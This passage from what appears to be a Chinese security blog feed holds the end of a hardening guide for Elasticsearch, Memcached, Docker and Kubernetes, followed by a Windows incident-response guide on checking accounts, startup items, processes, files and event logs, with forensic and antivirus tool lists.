8. 不要以 root 身份运行不要以 root 身份来运行 Elasticsearch，不要和其他服务共用相同的用户，并把用户的权限最小化 应用示例： sudo -u es-user ES_JAVA_OPTS=&quot;-Xms1024m -Xmx1024m&quot; /opt/elasticsearch/bin/elasticsearc9. 正确设置数据目录请确保为 Elasticsearch 的目录分配了合理的读写权限，避免使用共享文件系统。确保只有 Elasticsearch 的启动用户才有权访问目录。日志目录也需要正确配置，避免泄露敏感信息。 10. 定期进行备份使用 Elasticsearch 提供的备份还原机制，定期对 Elasticsearch 的数据进行快照备份。 11. 禁用批量删除索引Elasticsearch 支持使用全部（_all）和通配符（*）来批量删除索引。在生产环境，该操作存在一定风险，你可以通过设置 action.destructive_requires_name: true 参数来禁用它。 12. 启用日志记录功能Elasticsearch 的 config 文件夹里面有两个配置文件： elasticsearch.yml：基本配置文件。 logging.yml：日志配置文件。由于 Elasticsearch 使用 log4j 来记录日志的，logging.yml 中的设置请按普通 log4j 配置文件进行设置。 启用日志功能需要修改 elasticsearch.yml 配置文件： path.logs: /path/to/logs # 设置日志文件的存储路径，默认是 Elasticsearch 根目录下的 logs 文件夹 0x09 Memcached 服务安全加固漏洞描述 Memcached是一套常用的key-value缓存系统，由于它本身没有权限控制模块，所以对公网开放的Memcached服务很容易被攻击者扫描发现，攻击者通过命令交互可直接读取Memcached中的敏感信息 修复方案 Memcached默认没有启用安全功能，建议用户在使用时进行安全加固 1. 定期升级使用官方最新版本Memcached 2. 配置访问控制建议用户不要将服务发布到互联网上而被黑客利用，可以通过ECS安全组规则或iptables配置访问控制规则。例如，在Linux环境中运行命令iptables -A INPUT -p tcp -s 192.168.0.2 —dport 11211 -j ACCEPT，在iptables中添加此规则只允许192.168.0.2这个IP对11211端口进行访问 3. 绑定监听IP如果Memcached没有在公网开放的必要，可在Memcached启动时指定绑定的IP地址为 127.0.0.1。例如，在Linux环境中运行以下命令： memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid 4. 使用最小化权限账号使用普通权限账号运行，指定Memcached用户。例如，在Linux环境中运行以下命令来运行Memcached： memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11211 -c 1024 -P /tmp/memcached.pid5. 启用认证功能Memcached本身没有做验证访问模块,Memcached从1.4.3版本开始，能支持SASL认证。SASL认证详细配置手册 6. 修改默认端口修改默认11211监听端口为11222端口。在Linux环境中运行以下命令： memcached -d -m 1024 -u memcached -l 127.0.0.1 -p 11222 -c 1024 -P /tmp/memcached.pidMemcached命令参数说明 -d 是指启动一个守护进程。 -m 是指分配给Memcached使用的内存数量，单位是MB，以上为1024MB。 -u 是指运行Memcached的用户，推荐使用单独普通权限用户Memcached，而不要使用root权限账户。 -l 是指监听的服务器IP地址，例如指定服务器的IP地址为127.0.0.1。 -p 是用来设置Memcached的监听端口，默认端口为11211。建议设置1024以上的端口。 -c 是指最大运行的并发连接数，默认是1024。可按照您服务器的负载量来设定。 -P 是指设置保存Memcached的pid文件，例如保存在 /tmp/memcached.pid 位置。7. 备份数据为避免数丢失，升级前请做好备份，或者建立ECS硬盘快照 8. 主机基线检查主机检测及防护: 使用HIDS自动检测不安全的配置项；Memcached漏洞的检测和防护 0x0A Docker服务安全加固1. 加固主机操作系统在部署前需要对服务器操作系统进行安全加固，例如，更新所有软件补丁、配置强密码、关闭不必要的服务端口等。 2. 使用强制访问控制策略启用强制访问控制（Mandatory Access Control (MAC)），根据业务场景的具体分析，对Docker中使用的各种资源设置访问控制。 启用AppAamor功能： 启用SElinux功能： 3. 配置网络访问控制策略根据实际应用，对需要外网访问的端口（例如管理界面、API 2375端口等重要端口）、需要与外网交互的网络地址、端口、协议等进行梳理，使用iptables或ECS安全组策略对网络的出入设置严格的访问控制。 4. 不要使用root用户运行在软件使用中，有一些必须由root用户才能够进行的操作。但从安全角度，您需要将这一部分操作与仅使用普通用户权限即可执行的操作分离解耦。 在编写dockerfile时，您可以使用类似如下的命令创建一个普通权限用户，并设置创建的UID为以后运行程序的用户： Docker命令参考： https://docs.docker.com/reference/builder/#user https://docs.docker.com/reference/builder/#run 5. 禁止使用特权默认情况下，Docker容器是没有特权的，一个容器不允许访问任何设备；但当使用--privileged选项时，则该容器将能访问所有设备。 例如，当打开--privileged选项后，您就可以对Host中/dev/下的所有设备进行操作。但如果不是必须对host上的所有设备进行访问的话，您可以使用--device仅添加需要操作的设备。 6. 控制Docker容器资源配额控制CPU份额 Docker提供–cpu-shares参数，用于在创建容器时指定容器所使用的CPU份额值 使用示例： 当使用命令docker run -tid –cpu-shares 100 ubuntu:stress创建容器时，则最终生成的cgroup的CPU份额配置可以下面的文件中找到。 cpu-shares的值不能保证可以获得1个vcpu或者多少GHz的CPU资源，仅仅只是一个弹性的加权值 Docker提供了–cpu-period、–cpu-quota两个参数，用来控制容器可以分配到的CPU时钟周期。–cpu-period用来指定容器对CPU的使用要在多长时间内做一次重新分配，而–cpu-quota是用来指定在这个周期内，最多可以有多少时间用来运行这个容器。与–cpu-shares不同的是，这种配置是指定一个绝对值，而且没有弹性在里面，容器对CPU资源的使用绝对不会超过配置的值。cpu-period和cpu-quota的单位为微秒（μs）。cpu-period的最小值为1000微秒，最大值为1秒（10^6 μs），默认值为0.1秒（100000 μs）。cpu-quota的值默认为-1，表示不做控制。举例说明，如果容器进程需要每1秒使用单个CPU的0.2秒时间，可以将cpu-period设置为1000000（即1秒），cpu-quota设置为200000（0.2秒）。当然，在多核情况下，如果允许容器进程需要完全占用两个CPU，则可以将cpu-period设置为100000（即0.1秒），cpu-quota设置为200000（0.2秒）。使用示例：使用如下命令来创建容器docker run -tid –cpu-period 100000 –cpu-quota 200000 ubuntu。 控制CPU内核 对于多核CPU的服务器，使用–cpuset-cpus和–cpuset-mems参数，可以限定容器运行使用哪些CPU内核和内存节点。 该功能可以对需要高性能计算的容器进行性能最优的配置，对具有NUMA拓扑（具有多CPU、多内存节点）的服务器尤其有用。而如果服务器只有一个内存节点，则–cpuset-mems的配置基本上不会有明显效果。 使用示例：使用命令docker run -tid –name cpu1 –cpuset-cpus 0-2 ubuntu，表示创建的容器只能用0、1、2这三个内核。 混合使用CPU配额控制参数 在上述参数中，cpu-shares控制只用在容器竞争同一个内核的时间片时。如果通过cpuset-cpus指定容器A使用内核0，容器B只使用内核1，则在主机上只有这两个容器使用对应内核的情况，它们各自占用全部的内核资源，cpu-shares没有明显效果。 cpu-period、cpu-quota这两个参数一般联合使用。在单核或者通过cpuset-cpus强制容器使用一个CPU内核的情况下，即使cpu-quota超过cpu-period，也不会使容器使用更多的CPU资源。 cpuset-cpus、cpuset-mems只对多核、多内存节点上的服务器有效，并且必须与实际的物理配置匹配，否则也无法达到资源控制的目的。 控制内存配额 和CPU控制一样，Docker也提供了若干参数来控制容器的内存使用配额，可以控制容器的swap大小、可用内存大小等。主要有以下参数： memory-swappiness：控制进程将物理内存交换到swap分区的倾向，默认系数为60。系数越小，就越倾向于使用物理内存。取值范围为0-100。当值为100时，表示尽量使用swap分区；当值为0时，表示禁用容器swap功能。这点不同于宿主机，宿主机swappiness设置为0时，也不会禁用swap。 –kernel-memory：内核内存，不会被交换到swap上。一般情况下，不建议修改，可以直接参考Docker的官方文档。 –memory：设置容器使用的最大内存上限。默认单位为byte，可以使用K、G、M等带单位的字符串。 –memory-reservation：启用弹性的内存共享。当宿主机资源充足时，允许容器尽量多地使用内存，当检测到内存竞争或者低内存时，强制将容器的内存降低到memory-reservation所指定的内存大小。不设置此选项时，有可能出现某些容器长时间占用大量内存，带来性能上的损失。 –memory-swap：等于内存和swap分区大小的总和。设置为-1时，表示swap分区的大小是无限的。默认单位为byte，可以使用K、G、M等带单位的字符串。如果–memory-swap的设置值小于–memory的值，则使用默认值，为–memory-swap值的两倍。 7. 不运行不可信的Docker镜像不要运行不可信的Docker镜像作为互联网服务器，避免运行不完全理解的Docker镜像作为互联网服务器。 8. 开启日志记录功能Docker的日志可以分成两类，一类是stdout标准输出，另一类是文件日志。Dockerd支持的日志级别有debug、info、warn、error、fatal，默认的日志级别为info。 必要的情况下，您需要设置日志级别，这可以通过配置文件，或者启动参数-l或--log-level来完成。 方法一：修改配置文件/etc/docker/daemon.json。 方法二：使用docker run的时候指定 `--log-driver=syslog --log-opt syslog-facility=daemon`9. 定期安全扫描和更新补丁在生产环境中使用漏洞扫描工具可以检测镜像中的已知漏洞。 容器通常都不是从头开始构建的，所以一定要进行安全扫描，以便及时发现基础镜像中任何可能存在的漏洞，并及时更新补丁。 在应用程序交付生命周期中加入漏洞扫描的安全质量控制，防止部署易受攻击的容器。 0x0B Kubernetes服务安全加固1. 确保镜像无安全漏洞在部署前，应该确保所有的操作系统软件、Kubernetes软件为官方最新版本，防止部署后因为漏洞造成入侵事件。 在运维过程中，要不断执行持续安全漏洞扫描（Continuous Security Vulnerability Scanning），因为容器中可能存在包含已知漏洞（CVE）的过时包。新的漏洞每天都会出现，所以这不是一个一次性的工作，对镜像进行持续的安全评估是至关重要的。 定期对环境进行安全更新，一旦发现运行中容器的漏洞，您应该及时更新镜像并重新部署容器。尽量避免直接更新（例如，apt-update）到正在运行的容器，因为这样打破了镜像与容器的对应关系。 使用Kubernetes滚动升级功能可以方便地升级容器，该功能允许将镜像升级到最新版本来逐步更新正在运行的容器。 2. 只使用授权镜像如果无法保证只运行符合组织策略的镜像，那么组织会面临运行脆弱甚至恶意容器的危险。从未知的来源下载和运行镜像是危险的，它相当于在生产服务器上运行未知服务商的软件。 使用私有镜像存储您的合法镜像，这样能大量减少可能进入到您的环境的镜像数量。建议您将安全评估（如漏洞扫描）加入持续集成（CI）中，使其成为构建流程的一部分。 持续集成应确保只使用审查通过的代码来构建镜像。当镜像构建成功后，要对它进行安全漏洞扫描，且只有在不存在问题时，才能将镜像推送到私有镜像仓库。在安全评估中失败的镜像不应该被推送到镜像仓库中。 Kubernetes镜像授权插件的工作已经完成，预计会随Kubernetes 1.4发布。该插件允许阻止未授权镜像的分发，单击查看详情。 3. 限制对K8S节点的直接访问应该限制SSH登录或SSH Key免登录Kubernetes节点，减少对主机资源未授权的访问。应该要求用户使用kubectl exec命令，此命令能够在不访问主机的情况下直接访问容器环境。 您可以使用Kubernetes授权插件来进一步控制用户对资源的访问。它允许设置对指定命名空间、容器和操作的细粒度访问控制规则。 4. 修改默认端口Kubernets API Server进程提供Kuvernetes API。通常情况下，有一个进程运行在单一kubernetes-master节点上。 默认情况，Kubernetes API Server提供HTTP的两个端口： 本地主机端口 HTTP服务默认端口8080，修改标识–insecure-port 默认IP是本地主机，修改标识—insecure-bind-address 在HTTP中没有认证和授权检查 主机访问受保护 安全端口 默认端口6443，修改标识—secure-port 默认IP是首个非本地主机的网络接口，修改标识—bind-address HTTPS服务。 设置证书和密钥的标识，–tls-cert-file，–tls-private-key-file 认证方式，令牌文件或者客户端证书 使用基于策略的授权方式 基于安全考虑，会移除只读端口，使用Service Account代替。 5. API管理端口访问控制在某些配置文件中有一个代理（nginx）作为API Server进程运行在同一台机器上。该代理是HTTPS服务，认证端口是443，访问API Server是本地主机8080端口。在这些配置文件里，Secure Port通常设置为6443。 您可以使用ECS安全组防火墙规则，限制外部HTTPS通过443端口访问。 以上都是默认配置，每个云提供商可能会有所不同，您可以根据不同的业务场景灵活配置和调整。 6. 创建资源间的管理界限限制用户权限的范围可以减少错误或恶意活动的影响。Kubernetes命名空间允许将资源划分为逻辑命名组。在一个命名空间中创建的资源对其他命名空间是隐藏的。 默认情况下，用户在Kubernetes集群中创建的每个资源运行在名称为“default”的默认空间内。您也可以创建额外的命名空间并附加资源和用户给它们。您可以使用Kubernetes授权插件来创建策略，以便将不同用户的访问请求隔离到不同的命名空间中。 例如：以下策略将允许”alice”从命名空间”fronto”读取pods。 7. 定义资源配额运行没有资源限制的容器会将您的系统置于DoS或被其他租户干扰的风险中。为了防止和最小化这些风险，您应该定义资源配额。 默认情况下，Kubernetes集群中的所有资源没有对CPU和内存的使用限制。您可以创建资源配额策略，并附加到Kubernetes命名空间中来限制Pod对CPU和内存的使用。 下面的例子将限制命名空间中Pod的数量为4个，CPU使用在1和2之间，内存使用在1GB 和2GB之间。 在compute-resources.yaml文件中： 10. API Server认证与授权API Server权限控制分为三种：Authentication（身份认证）、Authorization（授权）、AdmissionControl（准入控制）。 身份认证 当客户端向Kubernetes非只读端口发起API请求时，Kubernetes通过三种方式来认证用户的合法性（即验证用户是否有权限操作API）：证书认证，Token认证，基本信息认证。 证书认证设置APIServer的启动参数：--client_ca_file=SOMEFILE验证被引用的文件中包含的client证书。如果被验证通过，那么这个验证记录中的主体对象将会作为请求的username。 Token认证设置APIServer的启动参数：--token_auth_file=SOMEFILEToken file的格式包含三列：token，username，userid。当使用Token作为验证方式时，需要在对APIServer的HTTP请求中增加一个Header字段Authorization，并将它的值设置为Bearer SOMETOKEN。 基本信息认证设置APIServer的启动参数：--basic_auth_file=SOMEFILE如果更改了文件中的密码，只有重新启动APIServer使其重新生效。该文件的基本格式包含三列：passwork，username，userid。当使用此作为认证方式时，需要在对APIServer的HTTP请求中增加一个Header字段Authorization，并将它的值设置为Basic BASE64ENCODEDUSER:PASSWORD。 授权 在Kubernetes中，认证和授权是分开的，而且授权发生在认证完成之后。认证过程是检验发起API请求的用户是不是他所声称的那个人；而授权过程则判断此用户是否有执行该API请求的权限；因此授权是以认证的结果作为基础的。 Kubernetes授权模块应用于所有对APIServer的HTTP访问请求，而访问只读端口不需要认证和授权过程。APIServer启动时默认将authorization_mode设置为AlwaysAllow模式，即永远允许。 Kubernetes授权模块检查每个HTTP请求，并提取请求上下文中的所需属性（例如：user，resource kind，namespace）与访问控制规则进行比较。任何一个API请求在被处理前都需要通过一个或多个访问控制规则的验证。 目前，Kubernetes支持并实现了以下授权模式（authorization_mode），这些授权模式可以通过在APIServer启动时传入参数进行选择。 AlwaysDeny模式屏蔽所有的请求（一般用于测试）。AlwaysAllow模式允许所有请求，默认APIServer启动时采用的便是AlwaysAllow模式。ABAC（Attribute-Based Access Control，即基于属性的访问控制）模式则允许用户自定义授权访问控制规则。 ABAC模式 一个API请求中有4个属性被用于用户授权过程： UserName：String类型，用于标识发起请求的用户。如果不进行认证、授权操作，则该字符串为空。 ReadOnly：Bool类型，标识该请求是否仅进行只读操作（GET就是只读操作）。 Kind：String类型，用于标识要访问的Kubernetes资源对象的类型。当访问/api/v1beta1/pods等API endpoint时，Kind属性才非空，但访问其他endpoint时，例如/version，/healthz等，Kind属性为空。 Namespace：String类型，用于标识要访问的Kubernetes资源对象所在的namespace。 对于ABAC模式，在APIServer启动时除了需要传入--authorization_mode=ABAC选项外，还需要指定--authorization_policy_file=SOME_FILENAME。authorization_policy_file文件的每一行都是一个JSON对象，该JSON对象是一个没有嵌套的Map数据结构，代表一个访问控制规则对象。一个访问控制规则对象是一个包含以下字段的Map： user：--token_auth_file指定的user字符串。 readonly：true或false。true表明该规则只应用于GET请求。 kind：Kubernetes内置资源对象类型，例如pods、events等。 namespace：也可以缩写成ns。 一个简单的访问控制规则文件如下所示，每一行定义一条规则： 说明：缺省的字段与该字段类型的零值（空字符串，0，false等）等价。 一个授权过程就是一个比较API请求中各属性与访问控制规则文件中对应的各字段是否匹配的一个过程。当APIServer接收到一个API请求时，该请求的各属性就已经确定了，如果有一个属性未被设置，则APIServer将其设为该类型的空值（空字符串，0，false等）。匹配规则如下所示： 如果API请求中的某个属性为空值，则规定该属性与访问控制规则文件中对应的字段匹配。 如果访问控制规则的某个字段为空值，则规定该字段与API请求的对应属性匹配。 如果API请求中的属性值非空且访问控制规则的某个字段值也非空，则将这两个值进行比较，如果相同则匹配，反之则不匹配。 API请求的属性元组（tuple）会与访问控制规则文件中的所有规则逐条匹配，只要有一条匹配则表示匹配成功，如若不然，则授权失败。 11. 记录所有的日志Kubernetes提供基于集群的日志，允许将容器活动日志记录到一个日志中心。当集群被创建时，每个容器的标准输出和标准错误都可以通过运行在每个节点上的Fluentd 服务记录到Stackdriver或Elasticsearch中，然后使用Kibana进行查看 0xFF 参考资源 https://www.elastic.co/cn/blog/reinforce-the-security-of-elasticsearch-101 https://kubernetes.io/blog/2016/08/security-best-practices-kubernetes-deployment/]]></content>
      <categories>
        <category>主机攻防</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Hardening</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Windows应急响应指南]]></title>
    <url>%2Fposts%2F10128%2F</url>
    <content type="text"><![CDATA[本文总结Windows系统入侵应急响应的实用思路与技巧... 0x01 系统排查1. 系统信息命令行输入msinfo32命令，打开系统信息窗口，可查看本地计算机硬件资源、组件和软件环境信息 软件环境中包含系统驱动程序、正在运行任务、加载的模块、服务、启动程序等信息 2. 用户账号系统被入侵后，需排查攻击者是否新建账户、激活系统默认账户、建立隐藏账户(账户名称最后加$)等 排查方法 123456789101112131415(1) 命令行查看&gt; net user //收集用户账户信息，无法查看隐藏账户&gt; net user username //查看某个账户详细信息(2) 图形界面查看a. CMD输入compmgmt.msc(计算机管理) -&gt; 本地用户和组 -&gt; 用户 //可查看隐藏账户b. 命令行输入lusermgr.msc，查看用户信息(3) wmic 命令&gt; wmic useraccount get name,SID //可查看隐藏账户 3. 启动项病毒后门等常用启动项来实现持久化驻留，检查服务器是否有异常的启动项 排查方法 12345678910111213141516171819(1) 任务管理器查看命令行中输入taskmgr命令，任务管理器 -&gt; 启动(2) 通过注册表查看单击【开始】&gt;【运行】，输入regedit，打开注册表，查看开机启动项是否正常，关注以下注册表项 a. HKEY_CURRENT_USER\software\micorsoft\windows\currentversion\run b. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run c. HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Runonce检查右侧是否有启动异常的项目(3) 通过组策略查看命令行运行gpedit.msc，计算机配置 -&gt; Windows设置 —&gt; 脚本(启动/关机) 4. 计划任务检查方法 1234567891011(1) 计算机管理CMD输入compmgmt.msc【计算机管理】 &gt; 【系统工具】&gt; 【任务计划程序】&gt; 【任务计划程序库】(2) schtasks命令命令行输入【schtasks】命令，获取任务计划信息；在较旧的系统用【at】命令(3) Powershell&gt; Get-ScheduledTask //查看当前系统所有任务计划信息 5. 服务自启功检查方法： 单击【开始】&gt;【运行】，输入services.msc，查看服务状态和启动类型，检查是否有异常服务 0x02 进程排查1. 排查思路123&gt; netstat -ano | findstr &quot;ESTABLISHED&quot; //查看目前的网络连接，定位可疑的ESTABLISHED&gt; tasklist | findstr “PID” //根据netstat定位出的pid，再通过tasklist命令排查进程 2. 技巧总结1234567891011121314151617181920212223242526272829(1) tasklist命令 a. 查看端口对应的PID： netstat -ano | findstr “port” ​b. 查看进程对应的PID：tasklist | findstr “PID” c. 显示进程与服务对应关系：tasklist /svc d. 查看加载DLL的进程：tasklist /m | more e. 查看特定DLL的调用情况：tasklist /m DLL名称(2) wmic命令 a. wmic process list full /format:csv //以csv格式显示进程所有信息 b. wmic process get name,parentprocessid,processid,commandline /format:csv //以csv格式显示进程特定列 c. wmic process where process=[pid] get parentprocessid //以pid的值为条件获取其父进程pid d. wmic process where processid=[pid] delete //删除指定pid的进程 e. wmic process where name=&quot;trojan.exe&quot; call terminate //删除指定进程名的进程(3) PowerShellPowerShell可查看存在守护进程的进程，查询时调用Wmi对象&gt; Get-WmiObject Win32_Process | select Name,ProcessId,ParentProcessId,Path,CommandLine //查看进程名、进程id，父进程id、进程路径、进程命令行等信息 0x03 文件排查1. 敏感目录123456789101112131415161718192021(1) 各个盘下temp目录恶意程序运行时投放出的文件(释放子体)多存放于路径相对固定的临时目录(2) 用户Recent文件Recent文件主要存储最近运行文件的快捷方式，可分析最近运行的文件来排查可疑文件【开始】&gt;【运行】，输入【%UserProfile%\Recent】，分析Recent文件(3) 预读取文件夹Prefetch为预读取文件夹，用于存放系统已访问过的文件预读取信息，扩展名为pf【开始】&gt;【运行】，输入【%SystemRoot%\Prefetch\】，排查Prefetch文件夹(4) Amcache.hve文件可查询应用程序的执行路径、上次执行的时间以及SHA1值【开始】&gt;【运行】，输入【%SystemRoot%\appcompat\Programs\】，排查Amcache.hve文件夹 2. 时间点查找入侵事件发生后，需优先确认时间发生的时间点，排查时间点前后的文件变动情况 排查技巧 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061(1) forfiles命令FORFILES [/P pathname] [/M searchmask] [/S] [/C command] [/D [+ | -] &#123;yyyy/MM/dd | dd&#125;]描述: 选择一个文件(或一组文件)并在那个文件上 执行一个命令。这有助于批处理作业。参数列表: /P pathname 表示开始搜索的路径。默认文件夹是当前工作的 目录 (.)。 /M searchmask 根据搜索掩码搜索文件。默认搜索掩码是 &apos;*&apos;。 /S 指导 forfiles 递归到子目录。像 &quot;DIR /S&quot;。 /C command 表示为每个文件执行的命令。命令字符串应该 用双引号括起来。 默认命令是 &quot;cmd /c echo @file&quot;。下列变量 可以用在命令字符串中: @file - 返回文件名。 @fname - 返回不带扩展名的文件名。 @ext - 只返回文件的扩展名。 @path - 返回文件的完整路径。 @relpath - 返回文件的相对路径。 @isdir - 如果文件类型是目录，返回 &quot;TRUE&quot;； 如果是文件，返回 &quot;FALSE&quot;。 @fsize - 以字节为单位返回文件大小。 @fdate - 返回文件上一次修改的日期。 @ftime - 返回文件上一次修改的时间。 要在命令行包括特殊字符，字符请以 0xHH 形式使用十六进制代码(例如，0x09 为 tab)。 内部 CMD.exe 命令前面应以 &quot;cmd /c&quot; 开始。 /D date 选择文件，其上一次修改日期大于或等于 (+)， 或者小于或等于 (-) 用 &quot;yyyy/MM/dd&quot; 格式指定的日期; 或选择文件，其上一次修改日期大于或等于 (+) 当前日期加 &quot;dd&quot; 天，或者小于或等于 (-) 当前 日期减 &quot;dd&quot; 天。有效的 &quot;dd&quot; 天数可以是 0 - 32768 范围内的任何数字。如果没有指定， &quot;+&quot; 被当作默认符号。 /? 显示此帮助消息。 0x04 日志分析1. 日志简介Windows主要有以下三类日志文件：应用程序日志、系统日志和安全日志 系统日志 123记录操作系统组件产生的事件，主要包括驱动程序、系统组件和应用软件的崩溃以及数据丢失错误等默认位置：%SystemRoot%\System32\Winevt\Logs\System.evtx 安全日志 123记录系统的安全审计事件，包含各种类型的登录日志、对象访问日志、进程追踪日志、特权使用、帐号管理、策略变更、系统事件。默认设置下，安全性日志是关闭的，管理员可以使用组策略来启动安全性日志，或者在注册表中设置审核策略默认位置：%SystemRoot%\System32\Winevt\Logs\Security.evtx 应用日志 123包含由应用程序或系统程序记录的事件，主要记录程序运行方面的事件，例如数据库程序可以在应用程序日志中记录文件错误。如果某个应用程序出现崩溃情况，可以从程序事件日志中找到相应的记录默认位置：%SystemRoot%\System32\Winevt\Logs\Application.evtx 2. 日志事件ID对于Windows事件日志分析，不同的EVENT ID代表了不同的意义，摘录一些常见的安全事件的说明 事件ID 说明 4624 登录成功 4625 登录失败 4634 注销成功 4647 用户启动的注销 4672 使用超级用户（如管理员）进行登录 4720 创建用户 每个成功登录的事件都会标记一个登录类型，不同登录类型代表不同的方式： 登录类型 描述 说明 2 交互式登录（Interactive） 用户在本地进行登录 3 网络（Network） 最常见的情况就是连接到共享文件夹或共享打印机时 4 批处理（Batch） 通常表明某计划任务启动 5 服务（Service） 每种服务都被配置在某个特定的用户账号下运行 7 解锁（Unlock） 屏保解锁 8 网络明文（NetworkCleartext） 登录的密码在网络上是通过明文传输的，如FTP 9 新凭证（NewCredentials） 使用带/Netonly参数的RUNAS命令运行一个程序 10 远程交互，（RemoteInteractive） 通过终端服务、远程桌面或远程协助访问计算机 11 缓存交互（CachedInteractive） 以一个域用户登录而又没有域控制器可用 3. 日志分析技巧事件查看器 123456789101112131415161718192021222324(1) 利用eventlog事件来查看系统账号登录情况 a. 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； b. 在事件查看器中，单击“安全”，查看安全日志； c. 在安全日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选。 4624 -- 登录成功 4625 -- 登录失败 4634 -- 注销成功 4647 -- 用户启动的注销 4672 -- 使用超级用户（如管理员）进行登录(2) 利用eventlog事件来查看计算机开关机的记录 a. 在“开始”菜单上，依次指向“所有程序”、“管理工具”，然后单击“事件查看器”； b. 在事件查看器中，单击“系统”，查看系统日志； c. 在系统日志右侧操作中，点击“筛选当前日志”，输入事件ID进行筛选 6006 -- 服务已启动，开机 6005 -- 服务已停止，关机 6009 -- 按ctrl、alt、delete键(非正常)关机 Log Parser Log Parser是微软公司出品的日志分析工具，功能强大，使用简单，可以分析基于文本的日志文件、XML 文件、CSV（逗号分隔符）文件，以及操作系统的事件日志、注册表、文件系统、Active Directory 1234567891011121314151617181920212223242526(1) 基本查询语法 Logparser.exe –i:EVT –o:DATAGRID &quot;SELECT * FROM c:\xx.evtx&quot;(2) 查询登录成功的事件 a. 登录成功的所有事件 LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where EventID=4624&quot; b. 指定登录时间范围的事件 LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where TimeGenerated&gt;&apos;2018-06-19 23:32:11&apos; and TimeGenerated&lt;&apos;2018-06-20 23:34:00&apos; and EventID=4624&quot; c. 提取登录成功的用户名和IP LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT EXTRACT_TOKEN(Message,13,&apos; &apos;) as EventType,TimeGenerated as LoginTime,EXTRACT_TOKEN(Strings,5,&apos;|&apos;) as Username,EXTRACT_TOKEN(Message,38,&apos; &apos;) as Loginip FROM c:\Security.evtx where EventID=4624&quot;(3) 查询登录失败的事件 a. 登录失败的所有事件 LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT * FROM c:\Security.evtx where EventID=4625&quot; b. 提取登录失败用户名进行聚合统计 LogParser.exe -i:EVT &quot;SELECT EXTRACT_TOKEN(Message,13,&apos; &apos;) as EventType,EXTRACT_TOKEN(Message,19,&apos; &apos;) as user,count(EXTRACT_TOKEN(Message,19,&apos; &apos;)) as Times,EXTRACT_TOKEN(Message,39,&apos; &apos;) as Loginip FROM c:\Security.evtx where EventID=4625 GROUP BY Message&quot;(4) 系统历史开关机记录 LogParser.exe -i:EVT –o:DATAGRID &quot;SELECT TimeGenerated,EventID,Message FROM c:\System.evtx where EventID=6005 or EventID=6006&quot; 0x05 工具集合1. 工具箱Sysinternals Suite : 微软发布的一套强大的免费工具程序集，共包括将近70个windows工具 AccessChk 了解特定用户或用户组对文件、目录、注册表项和Windows服务等资源具有哪种访问权限 AccessEnum 显示用户可以用何种访问权限访问您系统中的目录、文件和注册表项，使用此工具可查找权限漏洞 AdExplorer Active Directory Explorer 是一个高级的 Active Directory (AD) 查看器和编辑器 AutoRuns windows启动程序管理工具，可显示系统启动或登录时会自动启动的项目和配置，包括扩展和加载各种Windows进程 Handle 可显示哪些进程打开了哪些文件，以及更多其他信息 ListDLLs 列出所有当前加载的 DLL，包括加载位置及其版本号，2.0版将打印已加载模块的完整路径名 LogonSessions 列出系统中的活动登录会话 Process Explorer 进程查看器，查看进程的详细信息包括CPU，GPU，IO，线程，句柄，内存 Process Monitor 一个高级的windows监视器，实时显示文件系统，注册表，网络活动，进程或线程活动 PsTools PsTools 套件，可列出本地或远程计算机上运行的进程、远程运行进程、重新启动计算机、转储事件日志，以及执行其他任务 12345678910111213141516171819202122232425PsExec——执行远程过程PsFile——远程显示打开的文件PsGetSid——显示计算机的SID或一个用户PsInfo——系统信息列表PsKill——杀死进程的名字或进程IDPsList——列表详细信息流程PsLoggedOn——看谁的本地登录,通过资源共享PsLogList -倾倒事件日志记录PsPasswd——更改帐户密码psp -测试网络性能PsService——视图和控制服务PsShutdown——关闭,选择重新启动计算机PsSuspend——挂起和恢复过程 RegDelNull 扫描并删除包含嵌入空字符的注册表项，标准注册表编辑工具不能删除这种注册表项 RootkitRevealer 扫描系统以找出基于Rootkit的恶意软件 ShareEnum 扫描网络上的文件共享并查看其安全设置，以关闭安全漏洞 Strings 在二进制映像中搜索 ANSI 和 UNICODE 字符串 TcpView 显示TCP和UDP端点的详细清单，包括进程名、远程地址和TCP连接的状态 2. 监控分析 火绒剑 火绒推出的一款专业的内核级监控分析工具 3. 日志分析 Log Parser 微软推出的日志分析工具，可分析多种文件类型的系统事件日志、注册表、文件系统、Active Directory Event Log Explorer Windows日志分析工具，可用于查看，监视和分析跟事件记录 4. 病毒查杀 卡巴斯基：http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe 火绒安全软件：https://www.huorong.cn 360杀毒：http://sd.360.cn/download_center.html ESET NOD32 Antivirus: https://www.eset.com/us/home/antivirus/download/ 5. Webshell查杀 百度WEBDIR+：https://scanner.baidu.com/ 河马查杀：https://www.shellpub.com/ Web Shell Detector：http://www.shelldetector.com/ D盾_Web查杀：http://www.d99net.net/down/WebShellKill_V2.0.9.zip 6. 勒索软件解密 勒索病毒解密工具收集汇总：https://github.com/jiansiting/Decryption-Tools [腾讯哈勃]勒索软件专杀工具：https://habo.qq.com/tool/index [金山毒霸]勒索病毒免疫工具：http://www.duba.net/dbt/wannacry.html [瑞星]解密工具下载：http://it.rising.com.cn/fanglesuo/index.html [卡巴斯基]免费勒索解密器：https://noransom.kaspersky.com/ [Avast]免费勒索软件解密工具：https://www.avast.com/zh-cn/ransomware-decryption-tools [Emsisoft]免费勒索软件解密工具：https://www.emsisoft.com/ransomware-decryption-tools/free-download [nomoreransom]勒索软件解密工具集：https://www.nomoreransom.org/zh/index.html [MalwareHunterTeam]勒索软件解密工具集：https://id-ransomware.malwarehunterteam.com/]]></content>
      <categories>
        <category>应急响应</category>
      </categories>
      <tags>
        <tag>Incident Response</tag>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
